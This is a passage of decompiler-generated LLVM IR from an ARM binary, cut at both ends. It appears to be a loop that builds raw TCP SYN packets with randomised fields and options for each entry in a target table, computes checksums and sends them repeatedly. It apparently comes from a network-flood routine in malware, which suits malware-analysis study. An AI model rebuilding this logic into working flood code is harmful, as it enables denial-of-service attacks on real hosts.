  store i32 %v5_cacc, i32* %r3.global-to-local, align 4
  %v1_cad0 = trunc i32 %v5_cacc to i8
  store i8 %v1_cad0, i8* %v2_cac0, align 1
  %v0_cad4 = load i32, i32* %r1.global-to-local, align 4
  %v1_cad4 = add i32 %v0_cad4, 13
  %v2_cad4 = inttoptr i32 %v1_cad4 to i8*
  %v3_cad4 = load i8, i8* %v2_cad4, align 1
  %v4_cad4 = zext i8 %v3_cad4 to i32
  store i32 %v1_c9ac, i32* %r0.global-to-local, align 4
  %v1_cadc = and i32 %v4_cad4, 251
  %v5_cae0 = or i32 %v1_cadc, %v4_cae0
  store i32 %v5_cae0, i32* %r2.global-to-local, align 4
  %v1_cae4 = trunc i32 %v5_cae0 to i8
  store i8 %v1_cae4, i8* %v2_cad4, align 1
  %v0_cae8 = load i32, i32* %r1.global-to-local, align 4
  %v1_cae8 = add i32 %v0_cae8, 13
  %v2_cae8 = inttoptr i32 %v1_cae8 to i8*
  %v3_cae8 = load i8, i8* %v2_cae8, align 1
  %v4_cae8 = zext i8 %v3_cae8 to i32
  store i32 %v1_c9b0, i32* %r2.global-to-local, align 4
  %v1_caf0 = and i32 %v4_cae8, 253
  %v4_caf4 = or i32 %v1_caf0, %v3_caf4
  store i32 %v4_caf4, i32* %r3.global-to-local, align 4
  %v1_caf8 = trunc i32 %v4_caf4 to i8
  store i8 %v1_caf8, i8* %v2_cae8, align 1
  %v0_cafc = load i32, i32* %r1.global-to-local, align 4
  %v1_cafc = add i32 %v0_cafc, 12
  %v2_cafc = inttoptr i32 %v1_cafc to i8*
  %v3_cafc = load i8, i8* %v2_cafc, align 1
  %v4_cafc = zext i8 %v3_cafc to i32
  store i32 %v4_cafc, i32* %r2.global-to-local, align 4
  %v1_cb00 = add i32 %v0_cafc, 13
  %v2_cb00 = inttoptr i32 %v1_cb00 to i8*
  %v3_cb00 = load i8, i8* %v2_cb00, align 1
  %v4_cb00 = zext i8 %v3_cb00 to i32
  %tmp84 = urem i8 %v3_cafc, 16
  %v1_cb08 = zext i8 %tmp84 to i32
  %v1_cb0c = and i32 %v4_cb00, 254
  %v2_cb10 = or i32 %v1_cb0c, %v1_c9c0
  %v1_cb14 = or i32 %v1_cb08, 160
  store i32 %v1_cb14, i32* %r2.global-to-local, align 4
  %v1_cb18 = trunc i32 %v2_cb10 to i8
  store i8 %v1_cb18, i8* %v2_cb00, align 1
  %v0_cb1c = load i32, i32* %r2.global-to-local, align 4
  %v1_cb1c = trunc i32 %v0_cb1c to i8
  %v2_cb1c = load i32, i32* %r1.global-to-local, align 4
  %v3_cb1c = add i32 %v2_cb1c, 12
  %v4_cb1c = inttoptr i32 %v3_cb1c to i8*
  store i8 %v1_cb1c, i8* %v4_cb1c, align 1
  store i32 %v3_cb24, i32* %r0.global-to-local, align 4
  store i32 %v7_cb24, i32* %r2.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v2_cb30 = load i32, i32* %r1.global-to-local, align 4
  %v3_cb30 = add i32 %v2_cb30, 3
  %v4_cb30 = inttoptr i32 %v3_cb30 to i8*
  store i8 %v5_c9e0, i8* %v4_cb30, align 1
  %v0_cb34 = load i32, i32* %r0.global-to-local, align 4
  %v1_cb34 = trunc i32 %v0_cb34 to i8
  %v2_cb34 = load i32, i32* %r1.global-to-local, align 4
  %v3_cb34 = add i32 %v2_cb34, 1
  %v4_cb34 = inttoptr i32 %v3_cb34 to i8*
  store i8 %v1_cb34, i8* %v4_cb34, align 1
  %v0_cb38 = load i32, i32* @r6, align 4
  %v1_cb38 = trunc i32 %v0_cb38 to i8
  %v2_cb38 = load i32, i32* %r1.global-to-local, align 4
  %v3_cb38 = add i32 %v2_cb38, 2
  %v4_cb38 = inttoptr i32 %v3_cb38 to i8*
  store i8 %v1_cb38, i8* %v4_cb38, align 1
  %v0_cb3c = load i32, i32* @r5, align 4
  %v1_cb3c = load i32, i32* %r1.global-to-local, align 4
  %v2_cb3c = add i32 %v1_cb3c, 4
  %v3_cb3c = inttoptr i32 %v2_cb3c to i32*
  store i32 %v0_cb3c, i32* %v3_cb3c, align 4
  %v0_cb40 = load i32, i32* %ip.global-to-local, align 4
  %v1_cb40 = trunc i32 %v0_cb40 to i8
  %v2_cb40 = load i32, i32* %r4.global-to-local, align 4
  %v3_cb40 = add i32 %v2_cb40, 41
  %v4_cb40 = inttoptr i32 %v3_cb40 to i8*
  store i8 %v1_cb40, i8* %v4_cb40, align 1
  %v0_cb44 = load i32, i32* %r3.global-to-local, align 4
  %v1_cb44 = trunc i32 %v0_cb44 to i8
  %v2_cb44 = load i32, i32* %r4.global-to-local, align 4
  %v3_cb44 = add i32 %v2_cb44, 40
  %v4_cb44 = inttoptr i32 %v3_cb44 to i8*
  store i8 %v1_cb44, i8* %v4_cb44, align 1
  %v0_cb48 = call i32 @function_fe60()
  %v1_cb4c = mul i32 %v0_cb48, 256
  %v1_cb50 = and i32 %v1_cb4c, 3840
  %v1_cb54 = or i32 %v1_cb50, 356352
  %v3_cb5c = add nuw nsw i32 %v1_cb54, 2048
  %v1_cb60 = and i32 %v3_cb5c, ptrtoint (i32* @global_var_ff00.24 to i32)
  %v3_cb687 = udiv i32 %v1_cb60, 256
  store i32 %v3_cb687, i32* %r1.global-to-local, align 4
  %v0_cb6c = load i32, i32* %r4.global-to-local, align 4
  %v1_cb6c = add i32 %v0_cb6c, 42
  store i32 %v1_cb6c, i32* %r2.global-to-local, align 4
  %v4_cb70 = inttoptr i32 %v1_cb6c to i8*
  store i8 5, i8* %v4_cb70, align 1
  %v0_cb74 = load i32, i32* %r1.global-to-local, align 4
  %v1_cb74 = trunc i32 %v0_cb74 to i8
  %v2_cb74 = load i32, i32* %r2.global-to-local, align 4
  %v3_cb74 = add i32 %v2_cb74, 1
  %v4_cb74 = inttoptr i32 %v3_cb74 to i8*
  store i8 %v1_cb74, i8* %v4_cb74, align 1
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_cb80 = load i32, i32* %r4.global-to-local, align 4
  %v3_cb80 = add i32 %v2_cb80, 47
  %v4_cb80 = inttoptr i32 %v3_cb80 to i8*
  store i8 10, i8* %v4_cb80, align 1
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_cb8c = load i32, i32* %r3.global-to-local, align 4
  %v1_cb8c = trunc i32 %v0_cb8c to i8
  %v2_cb8c = load i32, i32* %r4.global-to-local, align 4
  %v3_cb8c = add i32 %v2_cb8c, 46
  %v4_cb8c = inttoptr i32 %v3_cb8c to i8*
  store i8 %v1_cb8c, i8* %v4_cb8c, align 1
  %v0_cb90 = load i32, i32* %r2.global-to-local, align 4
  %v1_cb90 = trunc i32 %v0_cb90 to i8
  %v2_cb90 = load i32, i32* %r4.global-to-local, align 4
  %v3_cb90 = add i32 %v2_cb90, 45
  %v4_cb90 = inttoptr i32 %v3_cb90 to i8*
  store i8 %v1_cb90, i8* %v4_cb90, align 1
  %v0_cb94 = load i32, i32* %r0.global-to-local, align 4
  %v1_cb94 = trunc i32 %v0_cb94 to i8
  %v2_cb94 = load i32, i32* %r4.global-to-local, align 4
  %v3_cb94 = add i32 %v2_cb94, 44
  %v4_cb94 = inttoptr i32 %v3_cb94 to i8*
  store i8 %v1_cb94, i8* %v4_cb94, align 1
  %v0_cb98 = call i32 @function_fe60()
  store i32 %v0_cb98, i32* %r0.global-to-local, align 4
  %v2_cba0 = load i32, i32* %r4.global-to-local, align 4
  %v3_cba0 = add i32 %v2_cba0, 56
  %v4_cba0 = inttoptr i32 %v3_cba0 to i8*
  store i8 1, i8* %v4_cba0, align 1
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_cbb0 = load i32, i32* %r4.global-to-local, align 4
  %v2_cbb0 = add i32 %v1_cbb0, 48
  %v3_cbb0 = inttoptr i32 %v2_cbb0 to i32*
  store i32 %v0_cb98, i32* %v3_cbb0, align 4
  %v0_cbb4 = load i32, i32* %r2.global-to-local, align 4
  %v1_cbb4 = trunc i32 %v0_cbb4 to i8
  %v2_cbb4 = load i32, i32* %r4.global-to-local, align 4
  %v3_cbb4 = add i32 %v2_cbb4, 58
  %v4_cbb4 = inttoptr i32 %v3_cbb4 to i8*
  store i8 %v1_cbb4, i8* %v4_cbb4, align 1
  %v0_cbb8 = load i32, i32* %r3.global-to-local, align 4
  %v1_cbb8 = trunc i32 %v0_cbb8 to i8
  %v2_cbb8 = load i32, i32* %r4.global-to-local, align 4
  %v3_cbb8 = add i32 %v2_cbb8, 59
  %v4_cbb8 = inttoptr i32 %v3_cbb8 to i8*
  store i8 %v1_cbb8, i8* %v4_cbb8, align 1
  %v0_cbbc = load i32, i32* %ip.global-to-local, align 4
  %v1_cbbc = load i32, i32* %r4.global-to-local, align 4
  %v2_cbbc = add i32 %v1_cbbc, 52
  %v3_cbbc = inttoptr i32 %v2_cbbc to i32*
  store i32 %v0_cbbc, i32* %v3_cbbc, align 4
  %v0_cbc0 = load i32, i32* %r2.global-to-local, align 4
  %v1_cbc0 = trunc i32 %v0_cbc0 to i8
  %v2_cbc0 = load i32, i32* %r4.global-to-local, align 4
  %v3_cbc0 = add i32 %v2_cbc0, 57
  %v4_cbc0 = inttoptr i32 %v3_cbc0 to i8*
  store i8 %v1_cbc0, i8* %v4_cbc0, align 1
  %v3_cbc4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_cbc4, i32* %r3.global-to-local, align 4
  %v1_cbc8 = add i32 %v3_cbc4, 1
  store i32 %v1_cbc8, i32* @r4, align 4
  %v0_cbcc = load i32, i32* @sl, align 4
  %v9_cbcc = icmp eq i32 %v0_cbcc, %v1_cbc8
  store i1 %v9_cbcc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_cbc8, i32* %stack_var_-40, align 4
  %v8_cbd4 = icmp sgt i32 %v0_cbcc, %v1_cbc8
  br i1 %v8_cbd4, label %dec_label_pc_c9e8, label %dec_label_pc_cbd8

dec_label_pc_cbd8:                                ; preds = %bb76, %dec_label_pc_c8fc
  %v0_cbd8 = phi i32 [ %v0_c928, %dec_label_pc_c8fc ], [ %v0_cbcc, %bb76 ]
  %v2_cbd8 = icmp eq i32 %v0_cbd8, 0
  store i1 %v2_cbd8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_cd90 = icmp eq i32 %v3_c918, 65535
  %v2_ce0c = icmp eq i32 %v1_c924, 0
  %v2_cc14 = icmp eq i32 %v6_c8b0, -1
  %v7_cc14 = icmp eq i32 %v6_c8b0, -1
  br label %dec_label_pc_cbe0.outer

dec_label_pc_cbe0.outer:                          ; preds = %dec_label_pc_cd0c, %dec_label_pc_cbd8
  %v1_cbe0.ph.in = phi i32 [ %v0_cd00, %dec_label_pc_cd0c ], [ %v0_cbd8, %dec_label_pc_cbd8 ]
  %v0_cbe0.ph = phi i1 [ %v2_cd0c, %dec_label_pc_cd0c ], [ %v2_cbd8, %dec_label_pc_cbd8 ]
  %v1_cbe0.ph = icmp slt i32 %v1_cbe0.ph.in, 0
  %v4_cbe0 = or i1 %v1_cbe0.ph, %v0_cbe0.ph
  br label %dec_label_pc_cbe0

dec_label_pc_cbe0:                                ; preds = %dec_label_pc_cbe0.outer, %dec_label_pc_cbe0
  br i1 %v4_cbe0, label %dec_label_pc_cbe0, label %dec_label_pc_cbe4

dec_label_pc_cbe4:                                ; preds = %dec_label_pc_cbe0
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_cbf0

dec_label_pc_cbf0:                                ; preds = %dec_label_pc_cc6c, %dec_label_pc_cbe4
  %v1_cc00 = phi i32 [ %v1_ccfc, %dec_label_pc_cc6c ], [ 0, %dec_label_pc_cbe4 ]
  %v5_cbf4 = mul i32 %v1_cc00, 24
  %v1_cbf8 = load i32, i32* @r8, align 4
  %v2_cbf8 = add i32 %v1_cbf8, %v5_cbf4
  store i32 %v2_cbf8, i32* %r3.global-to-local, align 4
  %v1_cbfc = add i32 %v2_cbf8, 20
  %v2_cbfc = inttoptr i32 %v1_cbfc to i8*
  %v3_cbfc = load i8, i8* %v2_cbfc, align 1
  %v4_cbfc = zext i8 %v3_cbfc to i32
  store i32 %v4_cbfc, i32* %r2.global-to-local, align 4
  %v0_cc00 = load i32, i32* %fp.global-to-local, align 4
  %v4_cc00 = mul i32 %v1_cc00, 4
  %v5_cc00 = add i32 %v0_cc00, %v4_cc00
  %v6_cc00 = inttoptr i32 %v5_cc00 to i32*
  %v7_cc00 = load i32, i32* %v6_cc00, align 4
  store i32 %v7_cc00, i32* @r5, align 4
  %v7_cc04 = icmp eq i8 %v3_cbfc, 31
  store i1 %v7_cc04, i1* %cpsr_z.global-to-local, align 1
  %v1_cc08 = add i32 %v7_cc00, 20
  store i32 %v1_cc08, i32* @r6, align 4
  %tmp85 = icmp ult i8 %v3_cbfc, 32
  br i1 %tmp85, label %dec_label_pc_cd18, label %dec_label_pc_cc10

dec_label_pc_cc10:                                ; preds = %dec_label_pc_cbf0
  store i32 %v6_c8b0, i32* %r0.global-to-local, align 4
  store i1 %v7_cc14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_cc14, label %dec_label_pc_cd80, label %dec_label_pc_cc1c

dec_label_pc_cc1c:                                ; preds = %dec_label_pc_cd18, %dec_label_pc_cc10
  store i32 %v3_c918, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_cd90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_cd90, label %dec_label_pc_cd9c, label %dec_label_pc_cc30

dec_label_pc_cc30:                                ; preds = %dec_label_pc_cd80.dec_label_pc_cc30_crit_edge, %dec_label_pc_cc1c
  %v1_cc34 = phi i32 [ %v1_cc34.pre, %dec_label_pc_cd80.dec_label_pc_cc30_crit_edge ], [ 65535, %dec_label_pc_cc1c ]
  store i32 %v3_c91c, i32* %r3.global-to-local, align 4
  %v9_cc34 = icmp eq i32 %v3_c91c, %v1_cc34
  store i1 %v9_cc34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_cc34, label %dec_label_pc_cdb8, label %dec_label_pc_cc3c

dec_label_pc_cc3c:                                ; preds = %dec_label_pc_cd9c.dec_label_pc_cc3c_crit_edge, %dec_label_pc_cc30
  %v1_cc40 = phi i32 [ %v1_cc40.pre, %dec_label_pc_cd9c.dec_label_pc_cc3c_crit_edge ], [ %v1_cc34, %dec_label_pc_cc30 ]
  store i32 %v3_c920, i32* %ip.global-to-local, align 4
  %v9_cc40 = icmp eq i32 %v3_c920, %v1_cc40
  store i1 %v9_cc40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_cc40, label %dec_label_pc_cdd4, label %dec_label_pc_cc48

dec_label_pc_cc48:                                ; preds = %dec_label_pc_cdb8.dec_label_pc_cc48_crit_edge, %dec_label_pc_cc3c
  %v1_cc4c = phi i32 [ %v1_cc4c.pre, %dec_label_pc_cdb8.dec_label_pc_cc48_crit_edge ], [ %v1_cc40, %dec_label_pc_cc3c ]
  store i32 %v5_c7ec, i32* %r0.global-to-local, align 4
  %v9_cc4c = icmp eq i32 %v5_c7ec, %v1_cc4c
  store i1 %v9_cc4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_cc4c, label %dec_label_pc_cdf0, label %dec_label_pc_cc54

dec_label_pc_cc54:                                ; preds = %dec_label_pc_cdd4.dec_label_pc_cc54_crit_edge, %dec_label_pc_cc48
  %v1_cc58 = phi i32 [ %v1_cc58.pre, %dec_label_pc_cdd4.dec_label_pc_cc54_crit_edge ], [ %v1_cc4c, %dec_label_pc_cc48 ]
  store i32 %v6_c804, i32* %r2.global-to-local, align 4
  %v9_cc58 = icmp eq i32 %v6_c804, %v1_cc58
  store i1 %v9_cc58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_cc58, label %dec_label_pc_ce04, label %dec_label_pc_cc60

dec_label_pc_cc60:                                ; preds = %dec_label_pc_cdf0, %dec_label_pc_cc54
  store i32 %v1_c924, i32* %r3.global-to-local, align 4
  store i1 %v2_ce0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ce0c, label %dec_label_pc_cc6c, label %dec_label_pc_ce18

dec_label_pc_cc6c:                                ; preds = %dec_label_pc_cc60, %dec_label_pc_ce04, %dec_label_pc_ce18
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_cc70 = load i32, i32* %r7.global-to-local, align 4
  %v1_cc70 = trunc i32 %v0_cc70 to i8
  %v2_cc70 = load i32, i32* @r5, align 4
  %v3_cc70 = add i32 %v2_cc70, 10
  %v4_cc70 = inttoptr i32 %v3_cc70 to i8*
  store i8 %v1_cc70, i8* %v4_cc70, align 1
  %v0_cc74 = load i32, i32* %r7.global-to-local, align 4
  %v1_cc74 = trunc i32 %v0_cc74 to i8
  %v2_cc74 = load i32, i32* @r5, align 4
  %v3_cc74 = add i32 %v2_cc74, 11
  %v4_cc74 = inttoptr i32 %v3_cc74 to i8*
  store i8 %v1_cc74, i8* %v4_cc74, align 1
  %v0_cc78 = load i32, i32* @r5, align 4
  store i32 %v0_cc78, i32* @r0, align 4
  %v2_cc7c = call i32 @function_e424(i32 %v0_cc78, i32 20)
  %v3_cc7c = trunc i32 %v2_cc7c to i8
  %v4_cc8027 = udiv i32 %v2_cc7c, 256
  %v1_cc84 = trunc i32 %v4_cc8027 to i8
  %v2_cc84 = load i32, i32* @r5, align 4
  %v3_cc84 = add i32 %v2_cc84, 11
  %v4_cc84 = inttoptr i32 %v3_cc84 to i8*
  store i8 %v1_cc84, i8* %v4_cc84, align 1
  %v3_cc88 = load i32, i32* @r5, align 4
  %v4_cc88 = add i32 %v3_cc88, 10
  %v5_cc88 = inttoptr i32 %v4_cc88 to i8*
  store i8 %v3_cc7c, i8* %v5_cc88, align 1
  %v0_cc8c = load i32, i32* @r6, align 4
  store i32 %v0_cc8c, i32* @r1, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  %v0_cc98 = load i32, i32* %r7.global-to-local, align 4
  %v1_cc98 = trunc i32 %v0_cc98 to i8
  %v3_cc98 = add i32 %v0_cc8c, 16
  %v4_cc98 = inttoptr i32 %v3_cc98 to i8*
  store i8 %v1_cc98, i8* %v4_cc98, align 1
  %v0_cc9c = load i32, i32* %r7.global-to-local, align 4
  %v1_cc9c = trunc i32 %v0_cc9c to i8
  %v2_cc9c = load i32, i32* @r6, align 4
  %v3_cc9c = add i32 %v2_cc9c, 17
  %v4_cc9c = inttoptr i32 %v3_cc9c to i8*
  store i8 %v1_cc9c, i8* %v4_cc9c, align 1
  %v0_cca0 = load i32, i32* @r5, align 4
  store i32 %v0_cca0, i32* %r0.global-to-local, align 4
  %v4_cca4 = call i32 @function_e480(i32 %v0_cca0, i32 %v0_cc8c, i32 10240, i32 40)
  %v5_cca4 = trunc i32 %v4_cca4 to i8
  store i32 %v4_cca4, i32* %r0.global-to-local, align 4
  %v4_cca828 = udiv i32 %v4_cca4, 256
  %v1_ccac = trunc i32 %v4_cca828 to i8
  %v2_ccac = load i32, i32* @r6, align 4
  %v3_ccac = add i32 %v2_ccac, 17
  %v4_ccac = inttoptr i32 %v3_ccac to i8*
  store i8 %v1_ccac, i8* %v4_ccac, align 1
  %v3_ccb0 = load i32, i32* @r6, align 4
  %v4_ccb0 = add i32 %v3_ccb0, 16
  %v5_ccb0 = inttoptr i32 %v4_ccb0 to i8*
  store i8 %v5_cca4, i8* %v5_ccb0, align 1
  %v3_ccb4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ccb4, i32* %r3.global-to-local, align 4
  %v0_ccb8 = load i32, i32* @r5, align 4
  %v1_ccb8 = add i32 %v0_ccb8, 20
  %v2_ccb8 = inttoptr i32 %v1_ccb8 to i32*
  %v3_ccb8 = load i32, i32* %v2_ccb8, align 4
  %v3_ccc0 = udiv i32 %v3_ccb8, 65536
  store i32 %v3_ccc0, i32* %r2.global-to-local, align 4
  %v5_ccc4 = mul i32 %v3_ccb4, 24
  %v1_ccc8 = load i32, i32* @r8, align 4
  %v2_ccc8 = add i32 %v1_ccc8, %v5_ccc4
  store i32 %v2_ccc8, i32* %ip.global-to-local, align 4
  %v3_cccc26 = udiv i32 %v3_ccb8, 16777216
  %v1_ccd0 = trunc i32 %v3_cccc26 to i8
  %v3_ccd0 = add i32 %v2_ccc8, 3
  %v4_ccd0 = inttoptr i32 %v3_ccd0 to i8*
  store i8 %v1_ccd0, i8* %v4_ccd0, align 1
  %v0_ccd4 = load i32, i32* %r2.global-to-local, align 4
  %v1_ccd4 = trunc i32 %v0_ccd4 to i8
  %v2_ccd4 = load i32, i32* %ip.global-to-local, align 4
  %v3_ccd4 = add i32 %v2_ccd4, 2
  %v4_ccd4 = inttoptr i32 %v3_ccd4 to i8*
  store i8 %v1_ccd4, i8* %v4_ccd4, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ccdc = load i32, i32* @r5, align 4
  store i32 %v0_ccdc, i32* %r1.global-to-local, align 4
  %v0_cce0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_cce0, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_ccec = load i32, i32* %ip.global-to-local, align 4
  %v6_ccf4 = inttoptr i32 %v0_ccdc to i32*
  %v7_ccf4 = call i32 @function_13eec(i32 %v0_cce0, i32* %v6_ccf4, i32 60, i32 16384, i32 %v0_ccec, i32 16)
  %v3_ccf8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ccf8, i32* %r3.global-to-local, align 4
  %v1_ccfc = add i32 %v3_ccf8, 1
  store i32 %v1_ccfc, i32* %r0.global-to-local, align 4
  %v0_cd00 = load i32, i32* @sl, align 4
  %v9_cd00 = icmp eq i32 %v0_cd00, %v1_ccfc
  store i1 %v9_cd00, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ccfc, i32* %stack_var_-40, align 4
  %v8_cd08 = icmp sgt i32 %v0_cd00, %v1_ccfc
  br i1 %v8_cd08, label %dec_label_pc_cbf0, label %dec_label_pc_cd0c

dec_label_pc_cd0c:                                ; preds = %dec_label_pc_cc6c
  %v2_cd0c = icmp eq i32 %v0_cd00, 0
  store i1 %v2_cd0c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cbe0.outer

dec_label_pc_cd18:                                ; preds = %dec_label_pc_cbf0
  %v1_cd18 = add i32 %v2_cbf8, 16
  %v2_cd18 = inttoptr i32 %v1_cd18 to i32*
  %v3_cd18 = load i32, i32* %v2_cd18, align 4
  store i32 %v3_cd18, i32* %r4.global-to-local, align 4
  %v0_cd1c = call i32 @function_fe60()
  store i32 %v0_cd1c, i32* %r0.global-to-local, align 4
  %v3_cd20 = load i32, i32* %stack_var_-40, align 4
  %v5_cd28 = mul i32 %v3_cd20, 24
  %v0_cd2c = load i32, i32* %r4.global-to-local, align 4
  %v1_cd30 = load i32, i32* @r8, align 4
  %v2_cd30 = add i32 %v1_cd30, %v5_cd28
  store i32 %v2_cd30, i32* %r1.global-to-local, align 4
  %v1_cd34 = and i32 %v0_cd2c, ptrtoint (i32* @global_var_ff00.24 to i32)
  store i32 %v1_cd34, i32* %r3.global-to-local, align 4
  %v1_cd2c = udiv i32 %v0_cd2c, 256
  %v3_cd38 = and i32 %v1_cd2c, 65280
  store i32 %v3_cd38, i32* %r2.global-to-local, align 4
  %v3_cd3c = mul i32 %v0_cd2c, 16777216
  store i32 %v3_cd3c, i32* %ip.global-to-local, align 4
  %v1_cd40 = add i32 %v2_cd30, 20
  %v2_cd40 = inttoptr i32 %v1_cd40 to i8*
  %v3_cd40 = load i8, i8* %v2_cd40, align 1
  %v4_cd40 = zext i8 %v3_cd40 to i32
  %v4_cd44 = mul i32 %v1_cd34, 256
  %v5_cd44 = or i32 %v4_cd44, %v3_cd3c
  store i32 %v5_cd44, i32* %ip.global-to-local, align 4
  %v4_cd48 = udiv i32 %v0_cd2c, 16777216
  %v5_cd48 = or i32 %v3_cd38, %v4_cd48
  %v2_cd4c = or i32 %v5_cd48, %v5_cd44
  %v7_cd50 = lshr i32 %v0_cd1c, %v4_cd40
  %v8_cd50 = add i32 %v7_cd50, %v2_cd4c
  store i32 %v8_cd50, i32* %r2.global-to-local, align 4
  %v3_cd5c = mul i32 %v8_cd50, 16777216
  %v1_cd54 = mul i32 %v8_cd50, 256
  %v4_cd60 = and i32 %v1_cd54, 16711680
  %v5_cd60 = or i32 %v4_cd60, %v3_cd5c
  store i32 %v5_cd60, i32* %r1.global-to-local, align 4
  store i32 %v6_c8b0, i32* %r0.global-to-local, align 4
  %v2_cd70 = call i32 @llvm.bswap.i32(i32 %v8_cd50)
  store i32 %v2_cd70, i32* %r3.global-to-local, align 4
  store i1 %v7_cc14, i1* %cpsr_z.global-to-local, align 1
  %v1_cd78 = load i32, i32* @r5, align 4
  %v2_cd78 = add i32 %v1_cd78, 16
  %v3_cd78 = inttoptr i32 %v2_cd78 to i32*
  store i32 %v2_cd70, i32* %v3_cd78, align 4
  br i1 %v2_cc14, label %dec_label_pc_cd80, label %dec_label_pc_cc1c

dec_label_pc_cd80:                                ; preds = %dec_label_pc_cd18, %dec_label_pc_cc10
  %v0_cd80 = call i32 @function_fe60()
  store i32 %v0_cd80, i32* %r0.global-to-local, align 4
  store i32 %v3_c918, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_cd90, i1* %cpsr_z.global-to-local, align 1
  %v1_cd94 = load i32, i32* @r5, align 4
  %v2_cd94 = add i32 %v1_cd94, 12
  %v3_cd94 = inttoptr i32 %v2_cd94 to i32*
  store i32 %v0_cd80, i32* %v3_cd94, align 4
  br i1 %v3_cd90, label %dec_label_pc_cd9c, label %dec_label_pc_cd80.dec_label_pc_cc30_crit_edge

dec_label_pc_cd80.dec_label_pc_cc30_crit_edge:    ; preds = %dec_label_pc_cd80
  %v1_cc34.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cc30

dec_label_pc_cd9c:                                ; preds = %dec_label_pc_cd80, %dec_label_pc_cc1c
  %v0_cd9c = call i32 @function_fe60()
  %v1_cd9c = trunc i32 %v0_cd9c to i8
  store i32 %v0_cd9c, i32* %r0.global-to-local, align 4
  %v4_cda029 = udiv i32 %v0_cd9c, 256
  %v1_cda4 = trunc i32 %v4_cda029 to i8
  %v2_cda4 = load i32, i32* @r5, align 4
  %v3_cda4 = add i32 %v2_cda4, 5
  %v4_cda4 = inttoptr i32 %v3_cda4 to i8*
  store i8 %v1_cda4, i8* %v4_cda4, align 1
  store i32 %v3_c91c, i32* %r3.global-to-local, align 4
  %v1_cdac = load i32, i32* @r4, align 4
  %v9_cdac = icmp eq i32 %v3_c91c, %v1_cdac
  store i1 %v9_cdac, i1* %cpsr_z.global-to-local, align 1
  %v3_cdb0 = load i32, i32* @r5, align 4
  %v4_cdb0 = add i32 %v3_cdb0, 4
  %v5_cdb0 = inttoptr i32 %v4_cdb0 to i8*
  store i8 %v1_cd9c, i8* %v5_cdb0, align 1
  %v0_cdb4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cdb4, label %dec_label_pc_cdb8, label %dec_label_pc_cd9c.dec_label_pc_cc3c_crit_edge

dec_label_pc_cd9c.dec_label_pc_cc3c_crit_edge:    ; preds = %dec_label_pc_cd9c
  %v1_cc40.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cc3c

dec_label_pc_cdb8:                                ; preds = %dec_label_pc_cd9c, %dec_label_pc_cc30
  %v0_cdb8 = call i32 @function_fe60()
  %v1_cdb8 = trunc i32 %v0_cdb8 to i8
  store i32 %v0_cdb8, i32* %r0.global-to-local, align 4
  store i32 %v3_c920, i32* %ip.global-to-local, align 4
  %v4_cdc0 = sdiv i32 %v0_cdb8, 256
  store i32 %v4_cdc0, i32* %r3.global-to-local, align 4
  %v1_cdc4 = load i32, i32* @r4, align 4
  %v9_cdc4 = icmp eq i32 %v3_c920, %v1_cdc4
  store i1 %v9_cdc4, i1* %cpsr_z.global-to-local, align 1
  %v3_cdc8 = load i32, i32* @r5, align 4
  %v4_cdc8 = add i32 %v3_cdc8, 20
  %v5_cdc8 = inttoptr i32 %v4_cdc8 to i8*
  store i8 %v1_cdb8, i8* %v5_cdc8, align 1
  %v0_cdcc = load i32, i32* %r3.global-to-local, align 4
  %v1_cdcc = trunc i32 %v0_cdcc to i8
  %v2_cdcc = load i32, i32* @r6, align 4
  %v3_cdcc = add i32 %v2_cdcc, 1
  %v4_cdcc = inttoptr i32 %v3_cdcc to i8*
  store i8 %v1_cdcc, i8* %v4_cdcc, align 1
  %v0_cdd0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cdd0, label %dec_label_pc_cdd4, label %dec_label_pc_cdb8.dec_label_pc_cc48_crit_edge

dec_label_pc_cdb8.dec_label_pc_cc48_crit_edge:    ; preds = %dec_label_pc_cdb8
  %v1_cc4c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cc48

dec_label_pc_cdd4:                                ; preds = %dec_label_pc_cdb8, %dec_label_pc_cc3c
  %v0_cdd4 = call i32 @function_fe60()
  %v1_cdd4 = trunc i32 %v0_cdd4 to i8
  %v4_cdd8 = sdiv i32 %v0_cdd4, 256
  store i32 %v4_cdd8, i32* %r3.global-to-local, align 4
  %v3_cddc = load i32, i32* @r6, align 4
  %v4_cddc = add i32 %v3_cddc, 2
